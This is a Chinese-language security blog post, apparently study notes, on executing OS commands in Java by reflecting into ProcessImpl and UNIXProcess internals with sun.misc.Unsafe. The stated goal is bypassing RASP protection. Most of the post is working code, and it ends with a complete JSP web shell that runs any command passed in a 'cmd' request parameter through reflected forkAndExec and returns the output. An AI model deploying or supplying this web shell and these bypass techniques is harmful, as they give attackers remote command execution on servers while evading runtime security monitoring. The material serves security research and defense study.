
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <title>JavaSec基础命令执行 | Arcueid&#39;s BLOG</title>
    <meta name="author" content="Arcueid" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <link rel="icon" href="/images/Arcueid.jpg" />
    <link rel="preconnect" href="https://cdn.staticfile.net" />
<script src="https://cdn.staticfile.net/vue/3.3.7/vue.global.prod.min.js"></script>
<link rel="stylesheet" href="https://cdn.staticfile.net/font-awesome/6.4.2/css/all.min.css" />
<link rel="preconnect" href="https://fonts.loli.net" />
<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
<script> const mixins = {}; </script>

<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>


<script src="https://cdn.staticfile.net/highlight.js/11.9.0/highlight.min.js"></script>
<script src="https://cdn.staticfile.net/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
<link
    rel="stylesheet"
    href="https://cdn.staticfile.net/highlight.js/11.9.0/styles/github.min.css"
/>
<script src="/js/lib/highlight.js"></script>


<script src="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.js"></script>
<script src="https://cdn.staticfile.net/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
<link rel="stylesheet" href="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.css" />
<script src="/js/lib/math.js"></script>


<script src="/js/lib/preview.js"></script>









<link rel="stylesheet" href="/css/main.css" />

<meta name="generator" content="Hexo 6.3.0"></head>
<body>
    <div id="layout">
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>加载过慢请开启缓存 浏览器默认开启</p>
                    <img src="/images/loading.gif" />
                </div>
            </div>
        </transition>
        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
    <nav id="desktop-menu">
        <a class="title" href="/">
            <span>ARCUEID&#39;S BLOG</span>
        </a>
        
        <a href="/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
    </nav>
    <nav id="mobile-menu">
        <div class="title" @click="showMenuItems = !showMenuItems">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;ARCUEID&#39;S BLOG</span>
        </div>
        <transition name="slide">
            <div class="items" v-show="showMenuItems">
                
                <a href="/">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-house fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                    </div>
                </a>
                
                <a href="/about">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-id-card fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                    </div>
                </a>
                
                <a href="/archives">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-box-archive fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                    </div>
                </a>
                
                <a href="/categories">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-bookmark fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                    </div>
                </a>
                
                <a href="/tags">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-tags fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                    </div>
                </a>
                
            </div>
        </transition>
    </nav>
</div>
<transition name="fade">
    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
</transition>

        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
            <div class="article">
    <div>
        <h1>JavaSec基础命令执行</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/1/27
        </span>
        
        
        <span class="tags">
            <span class="icon">
                <i class="fa-solid fa-tags fa-fw"></i>
            </span>
            
            
            <span class="tag">
                
                <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #ffa2c4">开发语言</a>
            </span>
            
            <span class="tag">
                
                <a href="/tags/java/" style="color: #00a596">java</a>
            </span>
            
            <span class="tag">
                
                <a href="/tags/%E4%BB%A3%E7%A0%81%E5%A4%8D%E5%AE%A1/" style="color: #ff7d73">代码复审</a>
            </span>
            
        </span>
        
    </div>
    
    <div class="content" v-pre>
        <p>记录<a target="_blank" rel="noopener" href="https://github.com/javaweb-sec/javaweb-sec%E7%9A%84%E5%AD%A6%E4%B9%A0">https://github.com/javaweb-sec/javaweb-sec的学习</a></p>
<h1 id="CommandExecute"><a href="#CommandExecute" class="headerlink" title="CommandExecute"></a>CommandExecute</h1><p>Runtime#exec</p>
<p>ProcessBuilder#start</p>
<p>以上两个最终都要调到ProcessImpl</p>
<p>而ProcessImpl会调用native的forkAndExec</p>
<p>实际最终都是调到Java_java_lang_ProcessImpl_forkAndExec</p>
<p>而我们只需要直接调用最终执行的<code>UNIXProcess/ProcessImpl</code>实现命令执行或者直接反射<code>UNIXProcess/ProcessImpl</code>的<code>forkAndExec</code>方法就可以绕过RASP实现命令执行了。</p>
<p>但是我本地跟了一下 最终调的是Java_java_lang_ProcessImpl_create  并没有找到 Java_java_lang_ProcessImpl_forkAndExec</p>
<p>在linux下有forkAndExec</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/80348e9d2a819916527fcb258707602d.png" alt="image-20240127135535440"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/595ea11cea97f3b0f654478d5b51d189.png" alt="image-20240127135551312"></p>
<pre><code class="cpp">Java_java_lang_ProcessImpl_create(JNIEnv *env, jclass ignored,
                                  jstring cmd,
                                  jstring envBlock,
                                  jstring dir,
                                  jlongArray stdHandles,
                                  jboolean redirectErrorStream)
&#123;
    jlong ret = 0;
    if (cmd != NULL &amp;&amp; stdHandles != NULL) &#123;
        const jchar *pcmd = (*env)-&gt;GetStringChars(env, cmd, NULL);
        if (pcmd != NULL) &#123;
            const jchar *penvBlock = (envBlock != NULL)
                ? (*env)-&gt;GetStringChars(env, envBlock, NULL)
                : NULL;
            const jchar *pdir = (dir != NULL)
                ? (*env)-&gt;GetStringChars(env, dir, NULL)
                : NULL;
            jlong *handles = (*env)-&gt;GetLongArrayElements(env, stdHandles, NULL);
            if (handles != NULL) &#123;
                ret = processCreate(
                    env,
                    pcmd,
                    penvBlock,
                    pdir,
                    handles,
                    redirectErrorStream);
                (*env)-&gt;ReleaseLongArrayElements(env, stdHandles, handles, 0);
            &#125;
            if (pdir != NULL)
                (*env)-&gt;ReleaseStringChars(env, dir, pdir);
            if (penvBlock != NULL)
                (*env)-&gt;ReleaseStringChars(env, envBlock, penvBlock);
            (*env)-&gt;ReleaseStringChars(env, cmd, pcmd);
        &#125;
    &#125;
    return ret;
&#125;
</code></pre>
<p>这里就不写Runtime和ProcessBuilder的了</p>
<h2 id="反射ProcessImpl命令执行"><a href="#反射ProcessImpl命令执行" class="headerlink" title="反射ProcessImpl命令执行"></a>反射ProcessImpl命令执行</h2><pre><code class="java">package tem;

import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Map;

public class Exec &#123;
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;
        Class&lt;?&gt; clazz = Class.forName(&quot;java.lang.ProcessImpl&quot;);
        Method startMethod = clazz.getDeclaredMethod(&quot;start&quot;, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);
        startMethod.setAccessible(true);
        startMethod.invoke(null,new String[]&#123;&quot;calc&quot;&#125;,null,null,null,false);
    &#125;
&#125;
</code></pre>
<p>高版本则需要用Unsafe绕过</p>
<pre><code class="java">package tem;

import sun.misc.Unsafe;

import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Map;

public class Exec &#123;
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, NoSuchFieldException &#123;
        Class&lt;?&gt; clazz = Class.forName(&quot;java.lang.ProcessImpl&quot;);
        Method startMethod = clazz.getDeclaredMethod(&quot;start&quot;, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);

        Field unsafeField = Unsafe.class.getDeclaredField(&quot;theUnsafe&quot;);
        unsafeField.setAccessible(true);
        Unsafe unsafe = (Unsafe) unsafeField.get(null);
        Class cureentClass = Exec.class;

        unsafe.getAndSetObject(cureentClass,unsafe.objectFieldOffset(Class.class.getDeclaredField(&quot;module&quot;)),Object.class.getModule());


        startMethod.setAccessible(true);
        startMethod.invoke(null,new String[]&#123;&quot;calc&quot;&#125;,null,null,null,false);
    &#125;
&#125;
</code></pre>
<h2 id="反射Java-java-lang-ProcessImpl-create命令执行"><a href="#反射Java-java-lang-ProcessImpl-create命令执行" class="headerlink" title="反射Java_java_lang_ProcessImpl_create命令执行"></a>反射Java_java_lang_ProcessImpl_create命令执行</h2><p>当ProcessImpl也不能用的时候可以考虑</p>
<p>过程如下</p>
<ol>
<li>使用<code>sun.misc.Unsafe.allocateInstance(Class)</code>特性可以无需<code>new</code>或者<code>newInstance</code>创建<code>ProcessImpl</code>类对象。</li>
<li>反射<code>ProcessImpl</code>类的<code>create</code>方法。</li>
<li>构造<code>create</code>需要的参数并调用。</li>
</ol>
<pre><code class="java">package tem;

import sun.misc.Unsafe;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class NativeExec &#123;
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException, InstantiationException, NoSuchMethodException, InvocationTargetException &#123;
        // 获取ProcessImpl的实例
        Field unsafeField = Unsafe.class.getDeclaredField(&quot;theUnsafe&quot;);
        unsafeField.setAccessible(true);
        Unsafe unsafe = (Unsafe) unsafeField.get(null);
        Class&lt;?&gt; clazz = Class.forName(&quot;java.lang.ProcessImpl&quot;);
        Object o = unsafe.allocateInstance(clazz);

        Method createMethod = clazz.getDeclaredMethod(&quot;create&quot;, String.class, String.class, String.class, long[].class, boolean.class);

        Class cureentClass = NativeExec.class;
        unsafe.getAndSetObject(cureentClass,unsafe.objectFieldOffset(Class.class.getDeclaredField(&quot;module&quot;)),Object.class.getModule());

        createMethod.setAccessible(true);
//        Constructor&lt;?&gt; declaredConstructor = clazz.getDeclaredConstructor(String[].class,String.class,String.class,long[].class,boolean.class,boolean.class);
//        declaredConstructor.setAccessible(true);
//        System.out.println(declaredConstructor);
//        Object p = declaredConstructor.newInstance(new String[]&#123;&quot;calc&quot;&#125;, null, null, new long[]&#123;-1L,-1L,-1L&#125;, false, false);
//        System.out.println(p);
        createMethod.invoke(null,
                &quot;calc&quot;,
                null,
                null,
                new long[]&#123;-1L,-1L,-1L&#125;,
                false);



    &#125;
&#125;
</code></pre>
<p>在linux下则是<code>forkAndExec</code> 这个直接抄了</p>
<p>过程如下</p>
<ol>
<li>使用<code>sun.misc.Unsafe.allocateInstance(Class)</code>特性可以无需<code>new</code>或者<code>newInstance</code>创建<code>UNIXProcess/ProcessImpl</code>类对象。</li>
<li>反射<code>UNIXProcess/ProcessImpl</code>类的<code>forkAndExec</code>方法。</li>
<li>构造<code>forkAndExec</code>需要的参数并调用。</li>
<li>反射<code>UNIXProcess/ProcessImpl</code>类的<code>initStreams</code>方法初始化输入输出结果流对象。</li>
<li>反射<code>UNIXProcess/ProcessImpl</code>类的<code>getInputStream</code>方法获取本地命令执行结果(如果要输出流、异常流反射对应方法即可)。</li>
</ol>
<pre><code class="java">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
&lt;%@ page import=&quot;sun.misc.Unsafe&quot; %&gt;
&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;
&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;
&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
&lt;%@ page import=&quot;java.lang.reflect.Method&quot; %&gt;
&lt;%!
    byte[] toCString(String s) &#123;
        if (s == null)
            return null;
        byte[] bytes  = s.getBytes();
        byte[] result = new byte[bytes.length + 1];
        System.arraycopy(bytes, 0,
                result, 0,
                bytes.length);
        result[result.length - 1] = (byte) 0;
        return result;
    &#125;


%&gt;
&lt;%
    String[] strs = request.getParameterValues(&quot;cmd&quot;);

    if (strs != null) &#123;
        Field theUnsafeField = Unsafe.class.getDeclaredField(&quot;theUnsafe&quot;);
        theUnsafeField.setAccessible(true);
        Unsafe unsafe = (Unsafe) theUnsafeField.get(null);

        Class processClass = null;

        try &#123;
            processClass = Class.forName(&quot;java.lang.UNIXProcess&quot;);
        &#125; catch (ClassNotFoundException e) &#123;
            processClass = Class.forName(&quot;java.lang.ProcessImpl&quot;);
        &#125;

        Object processObject = unsafe.allocateInstance(processClass);

        // Convert arguments to a contiguous block; it&#39;s easier to do
        // memory management in Java than in C.
        byte[][] args = new byte[strs.length - 1][];
        int      size = args.length; // For added NUL bytes

        for (int i = 0; i &lt; args.length; i++) &#123;
            args[i] = strs[i + 1].getBytes();
            size += args[i].length;
        &#125;

        byte[] argBlock = new byte[size];
        int    i        = 0;

        for (byte[] arg : args) &#123;
            System.arraycopy(arg, 0, argBlock, i, arg.length);
            i += arg.length + 1;
            // No need to write NUL bytes explicitly
        &#125;

        int[] envc                 = new int[1];
        int[] std_fds              = new int[]&#123;-1, -1, -1&#125;;
        Field launchMechanismField = processClass.getDeclaredField(&quot;launchMechanism&quot;);
        Field helperpathField      = processClass.getDeclaredField(&quot;helperpath&quot;);
        launchMechanismField.setAccessible(true);
        helperpathField.setAccessible(true);
        Object launchMechanismObject = launchMechanismField.get(processObject);
        byte[] helperpathObject      = (byte[]) helperpathField.get(processObject);

        int ordinal = (int) launchMechanismObject.getClass().getMethod(&quot;ordinal&quot;).invoke(launchMechanismObject);

        Method forkMethod = processClass.getDeclaredMethod(&quot;forkAndExec&quot;, new Class[]&#123;
                int.class, byte[].class, byte[].class, byte[].class, int.class,
                byte[].class, int.class, byte[].class, int[].class, boolean.class
        &#125;);

        forkMethod.setAccessible(true);// 设置访问权限

        int pid = (int) forkMethod.invoke(processObject, new Object[]&#123;
                ordinal + 1, helperpathObject, toCString(strs[0]), argBlock, args.length,
                null, envc[0], null, std_fds, false
        &#125;);

        // 初始化命令执行结果，将本地命令执行的输出流转换为程序执行结果的输出流
        Method initStreamsMethod = processClass.getDeclaredMethod(&quot;initStreams&quot;, int[].class);
        initStreamsMethod.setAccessible(true);
        initStreamsMethod.invoke(processObject, std_fds);

        // 获取本地执行结果的输入流
        Method getInputStreamMethod = processClass.getMethod(&quot;getInputStream&quot;);
        getInputStreamMethod.setAccessible(true);
        InputStream in = (InputStream) getInputStreamMethod.invoke(processObject);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        int                   a    = 0;
        byte[]                b    = new byte[1024];

        while ((a = in.read(b)) != -1) &#123;
            baos.write(b, 0, a);
        &#125;

        out.println(&quot;&lt;pre&gt;&quot;);
        out.println(baos.toString());
        out.println(&quot;&lt;/pre&gt;&quot;);
        out.flush();
        out.close();
    &#125;
%&gt;
</code></pre>

    </div>
    
    
    
    
    
    
    
</div>

            <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2025 Arcueid&#39;s BLOG
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;Arcueid
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

        </div>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/js/main.js"></script>
    
    




    
</body>
</html>
